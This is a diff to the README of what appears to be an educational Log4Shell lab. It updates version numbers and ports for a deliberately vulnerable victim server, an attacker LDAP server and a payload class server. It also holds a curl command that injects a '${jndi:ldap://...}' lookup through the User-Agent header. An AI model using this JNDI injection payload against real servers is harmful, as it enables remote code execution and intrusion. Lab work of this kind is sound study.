@@ -11,13 +11,13 @@ This repo is only for educational purposes only
 ## Run victim web server (app)
 ```
 gradlew build
-java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar build\libs\app-0.0.1.jar
+java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar build\libs\app-1.0.0.jar
 ```
 
 ## Run attacker malicious ldap server (ldap)
 ```
 gradlew build
-java -jar build\libs\ldap-1.0.0.jar http://localhost:8081/#Payload 636
+java -jar build\libs\ldap-1.0.0.jar http://localhost:8081/#Payload 389
 ```
 
 ## Run attacker java class payload server (payload)
@@ -35,7 +35,7 @@ java -jar build\libs\rce-1.0.0.jar
 
 ## Executing the attack
 ```
-curl http://localhost:8080/ -H 'User-Agent:${jndi:ldap://0.0.0.0:636/a}'
+curl http://localhost:8080/ -H 'User-Agent:${jndi:ldap://localhost/a}'
 ```
 
 ## Sample command in reverse shell
